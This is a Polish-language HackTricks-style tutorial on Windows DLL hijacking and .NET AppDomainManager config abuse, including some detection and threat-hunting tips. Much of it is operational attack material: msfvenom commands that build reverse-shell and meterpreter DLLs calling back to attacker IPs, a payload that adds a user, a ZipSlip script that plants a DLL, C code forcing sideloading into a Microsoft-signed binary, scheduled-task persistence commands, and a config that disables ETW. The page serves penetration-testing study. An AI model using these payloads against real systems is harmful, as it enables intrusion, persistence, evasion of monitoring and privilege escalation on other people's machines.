# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informacje podstawowe

DLL Hijacking polega na nakłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Metoda ta jest wykorzystywana głównie do wykonywania kodu i uzyskiwania persistence, a rzadziej do eskalacji uprawnień. Mimo że w tym miejscu skupiamy się na eskalacji, sposób przeprowadzania hijackingu pozostaje taki sam niezależnie od celu.

### Common Techniques

W przypadku DLL hijacking stosuje się kilka metod, a skuteczność każdej z nich zależy od sposobu, w jaki aplikacja ładuje biblioteki DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie prawdziwej biblioteki DLL złośliwą wersją, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnej biblioteki DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce wyszukiwania znajdującej się przed lokalizacją legalnej biblioteki, wykorzystując schemat wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, uznając ją za nieistniejącą, ale wymaganą bibliotekę DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby przekierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnej biblioteki DLL złośliwym odpowiednikiem w katalogu WinSxS — metoda często powiązana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu razem ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczny DLL sideloading nie jest jedynym sposobem na zmuszenie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **managed**, CLR sprawdza również plik konfiguracji aplikacji o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). Plik ten może definiować niestandardowy **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowany przez atakującego assembly umieszczony obok pliku EXE, CLR załaduje go **przed standardową ścieżką wykonywania kodu aplikacji** i uruchomi wewnątrz zaufanego procesu.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>` muszą być obecne, aby można było użyć niestandardowego managera.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalny menedżer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktyczne uwagi:
- Jest to technika charakterystyczna dla **.NET Framework**. Zależy od analizy konfiguracji CLR, a nie od kolejności wyszukiwania DLL w Win32.
- Host musi być rzeczywiście **managed EXE**. Szybka weryfikacja: `sigcheck -m target.exe`, `corflags target.exe` lub sprawdzenie obecności **CLR Runtime Header** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`) i zwykle znajduje się **obok pliku EXE**.
- Jest to przydatne w przypadku **podpisanych plików binarnych Microsoft/vendor**, ponieważ zaufany plik EXE pozostaje nietknięty, podczas gdy złośliwy managed assembly wykonuje się wewnątrz procesu.
- Jeśli masz już zapisywalny katalog instalatora/aktualizacji, AppDomainManager hijacking może zostać użyty jako **pierwszy etap**, a następnie można zastosować klasyczne DLL sideloading lub reflective loading dla kolejnych etapów.

### AppDomainManager jako downloader + bootstrap scheduled task

Praktyczny wzorzec intrusion polega na połączeniu zaufanego managed EXE zarówno ze złośliwym `*.config`, jak i ze złośliwą biblioteką DLL AppDomainManager, która działa wyłącznie jako **mały bootstrapper**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia podpisany instalator lub updater .NET z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Sąsiedni plik config powoduje, że CLR ładuje assembly atakującego **przed** rozpoczęciem działania właściwej aplikacji.
3. Złośliwy manager wykonuje **path gate** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE jest uruchomiony z katalogu `Downloads`, a drugi etap może działać wyłącznie z `%LOCALAPPDATA%`).
4. Jeśli sprawdzenie zakończy się pomyślnie, pobiera właściwy payload do zapisywalnej przez użytkownika ścieżki, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia persistence za pomocą scheduled task.

Dlaczego ten wariant ma znaczenie:
- Podpisany host EXE pozostaje niezmieniony, więc triage obejmujący wyłącznie hash głównego pliku binarnego może nie wykryć compromise.
- Często stosowany jest prosty **path-based anti-analysis**: przeniesienie triady ZIP/EXE/DLL na pulpit, do katalogu Temp lub do ścieżki sandboxa może celowo przerwać ten łańcuch.
- DLL AppDomainManager pierwszego etapu może pozostać mała i generować niewiele szumu, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład persistence często spotykany w tym wzorcu:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Uwagi:
- ` /rl highest` oznacza **najwyższy dostępny poziom** dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Ta technika jest często lepiej klasyfikowana jako **execution/persistence via .NET config abuse** niż klasyczne **missing-DLL search-order hijacking**, mimo że operatorzy często łączą oba podejścia.

Punkty kontrolne detekcji:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek po rozpakowaniu ZIP**, `Downloads`, `%TEMP%` lub innych folderów zapisywalnych przez użytkownika, wraz ze **współlokalnym** plikiem `<exe>.config`.
- Nowe zadania harmonogramu, których akcja wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a których nazwy przypominają aktualizatory przeglądarek/dostawców.
- Krótkotrwałe procesy bootstrapujące zarządzane przez .NET, które natychmiast pobierają kolejny plik EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie wcześniej, jeśli ścieżka pliku wykonywalnego nie odpowiada oczekiwanemu folderowi profilu użytkownika.

### Przejęcie istniejącego zadania harmonogramu w celu ponownego uruchomienia łańcucha sideloadingu

W kontekście persistence nie należy szukać wyłącznie **tworzenia nowego zadania**. Niektóre grupy intruzów czekają, aż legalny instalator utworzy **zwykłe zadanie aktualizatora**, a następnie **przepisują akcję zadania**, aby istniejąca nazwa, autor i wyzwalacz pozostały znajome dla osób odpowiedzialnych za detekcję.

Powtarzalny workflow:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj zadanie, które normalnie tworzy.
2. Wyeksportuj XML zadania i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp wyłącznie akcję, aby zadanie uruchamiało **trusted host EXE** z katalogu stagingowego zapisywalnego przez użytkownika, który następnie wykonuje sideloading lub ładuje właściwy payload za pomocą AppDomain.
4. Zarejestruj ponownie zadanie pod tą samą nazwą zamiast tworzyć nowy, oczywisty artefakt persistence.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Dlaczego jest to bardziej stealth:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jak updater dostawcy).
- Uruchamia je usługa **Task Scheduler**, więc walidacja procesu nadrzędnego/przodków często widzi oczekiwany łańcuch związany z harmonogramem zamiast `explorer.exe`.
- Zespoły DFIR, które wyszukują wyłącznie **nowe nazwy zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty do sprawdzenia:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj XML z `C:\Windows\System32\Tasks\*` oraz metadane z `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z baseline'em.
- Generuj alert, gdy **zadanie updatera wyglądające na zadanie dostawcy** uruchamia plik z **katalogów zapisywalnych przez użytkownika** lub uruchamia plik .NET EXE ze znajdującym się obok plikiem `*.config`.

> [!TIP]
> Aby zobaczyć łańcuch krok po kroku, który łączy staging HTML, konfiguracje AES-CTR oraz implanty .NET z DLL sideloadingiem, zapoznaj się z poniższym workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących Dll

Najczęstszym sposobem znajdowania brakujących Dll w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu sysinternals i **ustawienie** **następujących 2 filtrów**:

![Common Techniques - Finding missing Dlls: Najczęstszym sposobem znajdowania brakujących Dll w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie następujących 2 filtrów](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Najczęstszym sposobem znajdowania brakujących Dll w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie następujących 2 filtrów](<../../../images/image (230).png>)

i wyświetlanie tylko **File System Activity**:

![Common Techniques - Finding missing Dlls: i wyświetlanie tylko File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **brakujących dll ogólnie**, **pozostaw** to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, taki jak **"Process Name" "contains" `<exec name>`**, uruchom go i zatrzymaj przechwytywanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystanie brakujących Dll

Aby eskalować uprawnienia, szukaj **DLL, którą uprzywilejowany proces próbuje załadować** z lokalizacji, w której możesz zapisywać. Może się tak zdarzyć, gdy kontrolujesz katalog przeszukiwany przed katalogiem zawierającym legalną DLL albo gdy żądana DLL nie istnieje i możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania Dll

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć informacje o tym, jak dokładnie ładowane są Dll.**

**Aplikacje Windows** szukają DLL, korzystając z zestawu **wstępnie zdefiniowanych ścieżek** i zachowując określoną kolejność. Problem DLL hijacking występuje, gdy złośliwa DLL zostanie strategicznie umieszczona w jednym z tych katalogów, dzięki czemu zostanie załadowana przed autentyczną DLL. Jednym ze sposobów zapobiegania temu jest zapewnienie, że aplikacja używa ścieżek absolutnych przy odwoływaniu się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę tego katalogu.(_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie istnieje funkcja uzyskująca ścieżkę tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Należy pamiętać, że nie obejmuje to ścieżki właściwej dla aplikacji, określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany podczas obliczania ścieżki wyszukiwania DLL.

Jest to domyślna kolejność wyszukiwania przy włączonej funkcji **SafeDllSearchMode**. Gdy jest wyłączona, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie funkcja jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpoczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Ostatecznie DLL może zostać załadowana przy użyciu ścieżki absolutnej, a nie nazwy. W takim przypadku Windows szuka samej DLL wyłącznie pod tą ścieżką; zależności żądane po nazwie nadal korzystają z odpowiedniej kolejności wyszukiwania.

Istnieją inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj wyjaśniać.

### Łączenie dowolnego zapisu pliku z hijackingiem brakującej DLL

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny jest uruchamiany zgodnie z **harmonogramem/usługą**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (element nr 1 kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem rzeczywistej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj DLL z payloadem (np. reverse shell) z dowolnym eksportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli posiadaną primitive jest **dowolny zapis w stylu ZipSlip**, utwórz ZIP, którego wpis wychodzi poza katalog ekstrakcji, aby DLL trafiła do katalogu aplikacji:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do monitorowanej skrzynki odbiorczej/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje złośliwą bibliotekę DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając tutaj kontrolowany przez atakującego katalog, można zmusić proces docelowy, który rozwiązuje importowaną bibliotekę DLL na podstawie nazwy (bez ścieżki absolutnej i bez użycia bezpiecznych flag ładowania), do załadowania złośliwej biblioteki DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowe DllPath wskazujące na kontrolowany przez Ciebie folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy plik binarny docelowego procesu rozwiązuje bibliotekę DLL na podstawie nazwy, loader uwzględni podaną wartość DllPath podczas rozwiązywania, umożliwiając niezawodny sideloading, nawet gdy złośliwa biblioteka DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się od SetDllDirectory, które wpływa wyłącznie na bieżący proces.
- Proces docelowy musi importować bibliotekę DLL lub wywoływać LoadLibrary dla biblioteki DLL na podstawie nazwy (bez ścieżki absolutnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane na stałe ścieżki absolutne nie mogą zostać przejęte. Eksporty przekierowane i SxS mogą zmienić kolejność pierwszeństwa.

Minimalny przykład w C (ntdll, wide strings, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie sideloadingu DLL przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Umieść złośliwy plik xmllite.dll (eksportujący wymagane funkcje lub przekierowujący do prawdziwego pliku) w katalogu DllPath.
- Uruchom podpisany plik binarny, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, korzystając z powyższej techniki. Loader rozwiąże import za pośrednictwem podanego DllPath i wykona sideloading Twojego pliku DLL.

Zaobserwowano, że technika ta jest wykorzystywana in-the-wild do tworzenia wieloetapowych łańcuchów sideloadingu: początkowy launcher umieszcza pomocniczy plik DLL, który następnie uruchamia podpisany przez Microsoft plik binarny podatny na hijacking, z niestandardowym DllPath wymuszającym załadowanie pliku DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### Hijacking .NET AppDomainManager za pomocą `.exe.config`

W przypadku celów **.NET Framework** sideloading można wykonać **przed `Main()`**, bez patchowania pamięci, wykorzystując sąsiadujący z aplikacją plik **`.exe.config`**. Zamiast polegać wyłącznie na kolejności wyszukiwania DLL Win32, atakujący umieszcza prawidłowy plik .NET EXE obok złośliwego pliku konfiguracyjnego i jednego lub większej liczby kontrolowanych przez siebie assembly.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE uruchamia się, a **CLR odczytuje `<exe>.config`**.
2. Konfiguracja ustawia **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, aby runtime utworzył kontrolowany przez atakującego obiekt `AppDomainManager`.
3. Złośliwy manager uzyskuje **wykonanie przed `Main()`** wewnątrz zaufanego procesu hosta.
4. Ta sama konfiguracja może wymusić, aby CLR najpierw rozwiązywał lokalne assembly (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację i telemetry runtime bez patchowania inline.

Wzorzec w stylu kampanii (dokładne zagnieżdżenie może się różnić w zależności od dyrektywy / wersji CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** utrzymuje rozwiązywanie assembly w katalogu aplikacji, zmieniając folder w przewidywalną powierzchnię sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się właściwa logika aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji full-trust załadować niepodpisane lub zmodyfikowane assembly bez błędu walidacji strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** pozwala uniknąć przekierowań publisher policy do nowszych assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sprawia, że wybór runtime jest bardziej deterministyczny.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** z konfiguracji, zamiast modyfikować `EtwEventWrite` w pamięci przez implant.

Wzorzec operacyjny obserwowany w ostatnich kampaniach:
- Etap 1 zapisuje `setup.exe`, `setup.exe.config` i lokalne assembly.
- Etap 2 kopiuje je do wiarygodnego folderu **AppData update**, zmienia nazwę hosta na coś w rodzaju `update.exe`, a następnie ponownie go uruchamia za pomocą **scheduled task**.
- Etap 3 weryfikuje kontekst wykonania, na przykład oczekiwany proces nadrzędny `svchost.exe` z Task Scheduler, przed załadowaniem końcowego RAT DLL/export.

Pomysły na threat hunting:
- Podpisane lub w inny sposób legalne **.NET executables** uruchamiane z podejrzanymi sąsiadującymi plikami **`.config`** w lokalizacjach zapisywalnych przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Scheduled tasks ponownie uruchamiające przemianowane binaria update z **`%LOCALAPPDATA%`** lub właściwych dla aplikacji katalogów `\bin\update\`.
- Łańcuchy procesów nadrzędnych i podrzędnych, w których scheduled task uruchamia zaufany .NET host, który natychmiast ładuje assembly spoza vendora z własnego katalogu.

#### Wyjątki dotyczące kolejności wyszukiwania dll według dokumentacji Windows

Dokumentacja Windows wskazuje pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **DLL o tej samej nazwie co DLL już załadowany w pamięci**, system pomija standardowe wyszukiwanie. Zamiast tego sprawdza przekierowanie i manifest, a dopiero potem używa DLL już znajdującego się w pamięci. **W tym scenariuszu system nie wyszukuje DLL**.
- Jeśli DLL jest rozpoznany jako **known DLL** dla bieżącej wersji Windows, system użyje swojej wersji known DLL wraz ze wszystkimi zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie zależnych DLL odbywa się tak, jakby były wskazane wyłącznie za pomocą **nazw modułów**, niezależnie od tego, czy początkowy DLL został zidentyfikowany za pomocą pełnej ścieżki.

### Escalating Privileges

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (horizontal lub lateral movement), a któremu **brakuje DLL**.
- Upewnij się, że dostęp do zapisu jest dostępny dla dowolnego **katalogu**, w którym **DLL** będzie **wyszukiwany**. Może to być katalog pliku wykonywalnego lub katalog znajdujący się w ścieżce systemowej.

Te wymagania domyślnie występują rzadko: uprzywilejowane pliki wykonywalne zazwyczaj nie mają brakujących zależności DLL, a zwykli użytkownicy zwykle nie mogą zapisywać do katalogów systemowych znajdujących się w ścieżkach wyszukiwania. Błędnie skonfigurowane środowiska mogą jednak ujawnić oba warunki.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Chociaż jego głównym celem jest UAC bypass, zawiera PoC DLL-hijacking dla określonych wersji Windows, które często można dostosować do znalezionego zapisywalnego katalogu.

Pamiętaj, że możesz **sprawdzić uprawnienia do folderu**, wykonując:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego oraz eksporty biblioteki DLL za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik dotyczący **abuse Dll Hijacking w celu eskalacji uprawnień** przy uprawnieniach zapisu do folderu **System Path**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia zapisu do dowolnego folderu znajdującego się wewnątrz systemowego PATH.\
Innymi interesującymi zautomatyzowanymi narzędziami do wykrywania tej podatności są **funkcje PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll._

### Przykład

Jeśli znajdziesz scenariusz możliwy do wykorzystania, jedną z najważniejszych rzeczy niezbędnych do pomyślnego wykorzystania go będzie **utworzenie dll eksportującego co najmniej wszystkie funkcje, które plik wykonywalny będzie z niego importował**. Należy jednak pamiętać, że Dll Hijacking jest przydatny do [eskalacji z poziomu Medium Integrity do High **(z pominięciem UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z poziomu[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **tworzenia poprawnego dll** znajdziesz w tym opracowaniu dotyczącym dll hijacking, skoncentrowanym na dll hijacking do wykonywania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do utworzenia **dll z eksportowanymi funkcjami, które nie są wymagane**.

## **Tworzenie i kompilowanie Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll zdolny do **wykonywania złośliwego kodu po załadowaniu**, a jednocześnie do **udostępniania** funkcji i **działania** zgodnie z oczekiwaniami poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz wskazać plik wykonywalny i wybrać bibliotekę, którą chcesz poddać proxifikacji, a następnie **wygenerować proxified dll**, albo wskazać Dll i **wygenerować proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86, nie znalazłem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własny

W wielu przypadkach skompilowany przez Ciebie DLL musi **eksportować każdą funkcję importowaną przez proces ofiary**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozwiązać, a exploit kończy się niepowodzeniem.

<details>
<summary>Szablon DLL w C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
